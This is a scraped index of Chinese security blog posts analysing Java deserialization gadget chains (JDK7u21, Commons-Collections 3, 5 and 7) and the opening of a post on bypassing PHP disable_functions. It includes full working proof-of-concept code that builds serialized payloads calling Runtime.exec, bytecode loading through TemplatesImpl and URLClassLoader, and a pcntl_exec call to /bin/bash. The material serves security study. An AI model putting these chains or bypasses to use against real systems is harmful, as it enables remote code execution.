TransformerFactoryImpl()); String zeroHashCodeStr = \"f5a5a608\"; // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值 HashMap map = new HashMap(); map.put(zeroHashCodeStr, \"foo\"); // 实例化AnnotationInvocationHandler类 Constructor handlerConstructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); handlerConstructor.setAccessible(true); InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map); // 为tempHandler创造一层代理 Templates proxy = (Templates) Proxy.newProxyInstance(OriginalGadgetDemo.class.getClassLoader(), new Class[]{Templates.class}, tempHandler); // 实例化HashSet，并将两个对象放进去 HashSet set = new LinkedHashSet(); set.add(templates); set.add(proxy); // 将恶意templates设置到map中 map.put(zeroHashCodeStr, templates); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(set); oos.close(); // System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/:4:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["代码审计"],"content":"参考 phith0n Java 漫谈系列 Java反序列化漏洞原理解析 Java反序列化漏洞从入门到关门 从0开始学Java反序列化漏洞 深入理解 JAVA 反序列化漏洞 Java反序列化利用链补全计划 Commons-Collections 利用链分析 深入 Java 原生反序列化 \u0026 JDK7u21 利用链分析 ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/:5:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["代码审计"],"content":"Java 动态加载字节码 \u0026\u0026 CC 3、5、7","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"Java反序列化漏洞系列-4 ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:0:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"1 Java 动态加载字节码 ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:1:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"1.1 字节码 严格来说，Java 字节码其实仅仅指的是 Java 虚拟机执行使用的一类指令，通常被存储 在 .class 文件中。 众所周知，不同平台、不同 CPU 的计算机指令有差异，但因为 Java 是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台的 JVM 虚拟机中。 ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:1:1","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"1.2 利用 URLClassLoader 加载远程 class 文件 利用 Java 的 ClassLoader 来用来加载字节码文件最基础的方法。嘉文主要说明 URLClassLoader。正常情况下，Java 会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径(这些路径是经过处理后的 java.net.URL 类)来寻找 .class 文件来加载，而这个基础路径有分为三种情况： URL 未以斜杠 / 结尾，则认为是一个 JAR 文件，使用 JarLoader 来寻找类，即为在 Jar 包中寻找 .class 文件 URL 以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找 .class 文件 URL 以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是非 file 协议的情况下，最常见的就是 http 协议。 使用 HTTP 协议来测试，从远程 HTTP 服务器上加载 .class 文件： ClassLoader.java package com.geekby.javavuln; import java.lang.reflect.Method; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception { URL[] urls = {new URL(\"http://localhost:8000/\")}; URLClassLoader loader = URLClassLoader.newInstance(urls); Class c = loader.loadClass(\"Hello\"); Method f = c.getMethod(\"test\"); f.invoke(null, null); } } Hello.java public class Hello { public static void test() { System.out.println(\"test\"); } } 执行: 成功请求到 /Hello.class 文件，并执行了文件里的字节码，输出了「test」。 所以，如果攻击者能够控制目标 Java ClassLoader 的基础路径为一个 http 服务器，则可以利用远程加载的方式执行任意代码了。 ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:1:2","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"1.3 利用 ClassLoader#defineClass 直接加载字节码 不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是下面这三个方法调用: ClassLoader#loadClass ClassLoader#findClass ClassLoader#defineClass 其中： loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类，在前面没有找到的情况下，执行 findClass findClass 的作用是根据基础 URL 指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar 包或远程 http 服务器上读取字节码，然后交给 defineClass defineClass 的作用是处理前面传入的字节码，将其处理成真正的 Java 类 因此，真正核心的部分其实是 defineClass ，其决定了如何将一段字节流转变成一个 Java 类，Java 默认的 ClassLoader#defineClass 是一个 native 方法，逻辑在 JVM 的 C 语言代码中。 通过简单的代码示例，演示 defineClass 加载字节码： public class defineClassDemo { public static void main(String[] args) throws Exception{ Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); // 读取字节码并进行 base64 编码 byte[] b = Files.readAllBytes(Paths.get(\"Hello.class\")); String code = Base64.getEncoder().encodeToString(b); // base64 解码 byte[] byteCode = Base64.getDecoder().decode(code); Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), \"Hello\", byteCode, 0, byteCode.length); Method m = hello.getMethod(\"test\", null); m.invoke(null, null); } } 信息 在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的 static 块中，在 defineClass 时也无法被直接调用到。所以，如果要使用 defineClass 在目标机器上执行任意代码，需要想办法调用构造函数。 在实际场景中，因为 defineClass 方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是常用的一个攻击链 TemplatesImpl 的基石。 ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:1:3","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"1.4 利用 TemplatesImpl 加载字节码 前面提到过，开发者不会直接使用到 defineClass 方法，但是，Java 底层还是有一些类用到了它，如：TemplatesImpl。 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 这个类中定义了一个内部类 TransletClassLoader ，这个类里重写了 defineClass 方法，并且这里没有显式地声明其定义域。Java 中默认情况下，如果一个方法没有显式声明作用域，其作用域为 default。因此，这里被重写的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。 从 TransletClassLoader#defineClass() 向前追溯一下调用链： TemplatesImpl#getOutputProperties() -\u003e TemplatesImpl#newTransformer() -\u003e TemplatesImpl#getTransletInstance() -\u003e TemplatesImpl#defineTransletClasses() -\u003e TransletClassLoader#defineClass() 追到最前面两个方法 TemplatesImpl#getOutputProperties() 、 TemplatesImpl#newTransformer() ，这两者的作用域是 public，可以被外部调用。尝试用 newTransformer() 构造一个简单的 POC： public static void main(String[] args) throws Exception { String code = \"...\"; byte[] byteCode = Base64.getDecoder().decode(code); TemplatesImpl obj = new TemplatesImpl(); // _bytecodes 是由字节码组成的数组 Class c = TemplatesImpl.class; Field _bytecodes = c.getDeclaredField(\"_bytecodes\"); _bytecodes.setAccessible(true); _bytecodes.set(obj, new byte[][]{byteCode}); // _name 可以是任意字符串，只要不为 null 即可 Field _name = c.getDeclaredField(\"_name\"); _name.setAccessible(true); _name.set(obj, \"HelloTemplatesImpl\"); // 固定写法 Field _tfactory = c.getDeclaredField(\"_tfactory\"); _tfactory.setAccessible(true); _tfactory.set(obj, new TransformerFactoryImpl()); obj.newTransformer(); } 但是，TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。需要构造一个特殊的类： public class HelloTemppaltesImpl extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} public HelloTemppaltesImpl() { super(); System.out.println(\"Hello TemplatesImpl\"); } } 在多个 Java 反序列化利用链，以及 fastjson、jackson 的漏洞中，都曾出现过 TemplatesImpl 的身影。 ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:1:4","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"1.5 利用 BCEL ClassLoader 加载字节码 BCEL 的全名为 Apache Commons BCEL，属于 Apache Commons 项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 JAXP 的实现，所以 BCEL 也被包含在了 JDK 的原生库中。 通过 BCEL 提供的两个类 Repository 和 Utility 来利用：用于将一个 Java Class 先转换成原生字节码，当然这里也可以直接使用 javac 命令来编译 java 文件生成字节码；Utility 用于将原生的字节码转换成 BCEL 格式的字节码： import com.sun.org.apache.bcel.internal.Repository; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.classfile.JavaClass; public class BCELdemo { public static void main(String[] args) throws Exception { JavaClass cls = Repository.lookupClass(evil.Hello.class); String code = Utility.encode(cls.getBytes(), true); System.out.println(code); } } 而 BCEL ClassLoader 用于加载这串特殊的 bytecode，并可以执行其中的代码: ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:1:5","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"2 CommonsCollections 3 Gadget 分析 在 CC1 中，利用 TransformedMap 来执行任意方法，上一节中提到过，利用 TemplatesImpl 执行字节码，可以将两者合并，构造出如下 POC： package com.geekby.cc3test; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class Main { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\"HelloTemppaltesImpl.class\")); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][] {code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[] { new ConstantTransformer(obj), new InvokerTransformer(\"newTransformer\", null, null) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"poc\"); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 但是，在 ysoserial 中的 CC3 中，并没有用到 InvokerTransformer。 SerialKiller 是一个 Java 反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。在其发布的第一个版本代码中，可以看到其给出了最初的黑名单： 这个黑名单中 InvokerTransformer 赫然在列，也就切断了 CommonsCollections1 的利用链。ysoserial 随后增加了新的 Gadgets，其中就包括 CommonsCollections3。 CommonsCollections3 的目的很明显，就是为了绕过一些规则对 InvokerTransformer 的限制。CommonsCollections3 并没有使用到 InvokerTransformer 来调用任意方法，而是用到了另一个类，com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter。 这个类的构造方法中调用了 (TransformerImpl) templates.newTransformer() ，免去了使用 InvokerTransformer 手工调用 newTransformer() 方法这一步: 当然，缺少了 InvokerTransformer，TrAXFilter 的构造方法也是无法调用的。通过利用 org.apache.commons.collections.functors.InstantiateTransformer 中的 InstantiateTransformer 调用构造方法。 所以，最终的目标是，利用 InstantiateTransformer 来调用到 TrAXFilter 的构造方法，再利用其构造方法里的 templates.newTransformer() 调用到 TemplatesImpl 里的字节码。 构造的 Transformer 调用链如下： Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { obj }) }; 最终也是可以成功触发的： 警告 这个 POC 和 CC1 也有同样的问题，就是只支持 Java 8u71 及以下版本。 完整的反序列化过程如下： package com.geekby.cc3test; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class CC3Original { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\"/Volumes/MacOS/WorkSpace/JAVA/ClassLoaderVuln/http/HelloTemppaltesImpl.class\")); TemplatesImpl obj = new TemplatesImpl()","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:2:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"3 CommonsCollections 5 Gadget 分析 CC5 的调用链： -\u003eBadAttributeValueExpException.readObject() -\u003eTiedMapEntry.toString() -\u003eTiedMapEntry.getValue() -\u003eLazyMap.get() -\u003eChainedTransformer.transform() -\u003eConstantTransformer.transform() -\u003eInvokerTransformer.transform() -\u003e………… 这里又回到了去触发 LazyMap.get()，只不过改变了 LazyMap.get() 的触发方式，不再借助 AnnotationInvocationHandler 的反序列化触发。 在 TiedMapEntry 类中： public class TiedMapEntry implements Entry, KeyValue, Serializable { private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; //构造函数，显然我们可以控制 this.map 为 LazyMap public TiedMapEntry(Map map, Object key) { this.map = map; this.key = key; } //toString函数，注意这里调用了 getValue() public String toString() { return this.getKey() + \"=\" + this.getValue(); } //跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get() public Object getValue() { return this.map.get(this.key); } } 综上，通过 TiedMapEntry.toString() 可触发 LazyMap.get() 通过交叉引用搜索，是否存在一个类可以在反序列化过程中触发 TiedMapEntry.toString()，最终找到了 BadAttributeValueExpException： public class BadAttributeValueExpException extends Exception { private Object val; //这里可以控制 val 为 TiedMapEntry private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); //这里是关键点，调用toString() } else { val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName(); } } } 最终实现代码： import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections5 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { //Transformer数组 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; //ChainedTransformer实例 Transformer chainedTransformer = new ChainedTransformer(transformers); //LazyMap实例 Map uselessMap = new HashMap(); Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer); //TiedMapEntry 实例 TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"test\"); //BadAttributeValueExpException 实例 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); //反射设置 val Field val = BadAttributeValueExpException.class.getDeclaredField(\"val\"); val.setAccessible(true); val.set(badAttributeValueExpException, tiedMapEntry); //序列化 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(badAttributeValueExpException); oos.flush(); oos.close(); //测试反序列化 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } } ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:3:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"4 CommonsCollections 7 Gadget 分析 cc7 调用链： //这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同 -\u003eHashtable.readObject() -\u003eHashtable.reconstitutionPut() -\u003eAbstractMapDecorator.equals -\u003eAbstractMap.equals() -\u003eLazyMap.get() -\u003eChainedTransformer.transform() -\u003eConstantTransformer.transform() -\u003eInvokerTransformer.transform() -\u003e………… LazyMap 之后的利用链也和 CC1 相同，前面用了新的链进行触发。这里仍然是想办法触发 LazyMap.get()。在 Hashtable 的 readObject 中，遇到 hash 碰撞时，通过调用一个对象的 equals 方法对比两个对象，判断是否为真的 hash 碰撞。这里的 equals 方法是 AbstractMap 的 equals 方法。 ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:4:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"4.1 AbstractMap 由于 LazyMap 没有实现 equals 方法，所以调用其 equals 方法即调用其父类 AbstractMapDecorator 的 equals 方法： public boolean equals(Object object) { if (object == this) { return true; } return map.equals(object); } 即调用其所包装的 map 的 equals 方法。 如果这里包装的是 HashMap 而其没有实现 equals 方法，就会调用其父类 AbstractMap 的 equals方法： public boolean equals(Object o) { ... Map\u003cK,V\u003e m = (Map\u003cK,V\u003e) o; ... if (value == null) { if (!(m.get(key)==null \u0026\u0026 m.containsKey(key))) return false; } else { if (!value.equals(m.get(key))) return false; } ... } 此处调用了参数的 get 方法，可以此触发 LazyMap.get 从而完成利用。 ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:4:1","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"4.2 Hashtable 这里使用 Hashtable 来充当反序列化链的触发点，其反序列化过程中调用了自身的 reconstitutionPut 方法，Hashtable 类的关键代码如下： //Hashtable 的 readObject 方法 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { ……………… for (; elements \u003e 0; elements--) { K key = (K)s.readObject(); V value = (V)s.readObject(); //reconstitutionPut方法 reconstitutionPut(newTable, key, value); } this.table = newTable; } //跟进 reconstitutionPut 方法 private void reconstitutionPut(Entry\u003cK,V\u003e[] tab, K key, V value) throws StreamCorruptedException { ... int hash = hash(key); int index = (hash \u0026 0x7FFFFFFF) % tab.length; for (Entry\u003cK,V\u003e e = tab[index] ; e != null ; e = e.next) { if ((e.hash == hash) \u0026\u0026 e.key.equals(key)) { throw new java.io.StreamCorruptedException(); } } Entry\u003cK,V\u003e e = tab[index]; tab[index] = new Entry\u003c\u003e(hash, key, value, e); count++; } 而这里想要触发 equals 方法需要满足两个条件： tab[index] != null：即相同的 index 应出现两次 e.hash == hash：即两个相同的 index 对应的 Entry 的键对应的 hash 相同 这里会发现 hash 相同则 index 一定相同，所以可能会认为只要设置两个相同的 key 使得 hash 相同即可。 相同的 key 确实可以触发 equals，但是回到一开始的 LazyMap.get 的触发条件，get 需要接收一个不存在的 key 才可以触发 transform，所以需要找到两个值不相等但 hash 相等的变量。 这里 ysoserial 用了字符串，查看 String.hashCode ： public int hashCode() { int h = hash; if (h == 0 \u0026\u0026 value.length \u003e 0) { char val[] = value; for (int i = 0; i \u003c value.length; i++) { h = 31 * h + val[i]; } hash = h; } return h; } 这里只需要找到四个字符分成两个不同的组(AB、CD)，使得 31 * A + B == 31 * C + D 即可。ysoserial 中使用了 yy 和 zZ，但这里还存在很多种可能。 ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:4:2","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"4.3 POC import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CommonsCollections7 { public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException { Transformer[] fakeTransformer = new Transformer[]{}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; //ChainedTransformer实例 //先设置假的 Transformer 数组，防止生成时执行命令 Transformer chainedTransformer = new ChainedTransformer(fakeTransformer); //LazyMap实例 Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer); lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer); lazyMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, \"test\"); hashtable.put(lazyMap2, \"test\"); //通过反射设置真的 ransformer 数组 Field field = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); field.setAccessible(true); field.set(chainedTransformer, transformers); //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=\u003eyy，所以这里要移除 lazyMap2.remove(\"yy\"); //序列化 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(hashtable); oos.flush(); oos.close(); //测试反序列化 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } } ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:4:3","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["代码审计"],"content":"参考 phith0n Java 漫谈系列 Java反序列化漏洞原理解析 Java反序列化漏洞从入门到关门 从0开始学Java反序列化漏洞 深入理解 JAVA 反序列化漏洞 Java反序列化利用链补全计划 Commons-Collections 利用链分析 CC链 1-7 分析 Java 安全学习 Day2 – ysoserial CC 系列 ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:5:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["渗透测试"],"content":"常见 Bypass Disable Functions 方法总结","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"常见 Bypass Disable Functions 方法总结 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:0:0","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"1 背景 PHP.ini 中可以设置禁用一些危险函数，例如 eval、exec、system 等，将其写在 php.ini 配置文件中，就是我们所说的 disable_functions 了，特别是虚拟主机运营商，为了彻底隔离同服务器的客户，以及避免出现大面积的安全问题，在 disable_functions 的设置中也通常较为严格。 如果在渗透时，上传了 webshell 却因为 disable_functions 禁用了函数而无法执行命令，这时候就需要想办法进行绕过，突破 disable_functions。 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:1:0","tags":["渗透测试"],"title":"常见Bypass Disable Functions方法","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"2 黑名单绕过 即便是通过 disable functions 限制危险函数，也可能会有限制不全的情况。可以执行命令的哈函数可以参考：PHP webshell 检测。还有一个比较常见的易被忽略的函数就是 pcntl_exec。 pcntl 是 linux 下的一个扩展，可以支持 php 的多线程操作。很多时候会碰到禁用 exec 函数的情况，但如果运维人员安全意识不强或对 PHP 不甚了解，则很有可能忽略 pcntl 扩展的相关函数。 使用 pcntl_exec 的前提是开启了 pcntl 插件。 \u003c?php if(function_exists('pcntl_exec')) { pcntl_exec(\"/bin/bash\", array(\"/tmp/test.sh\")); } else { echo 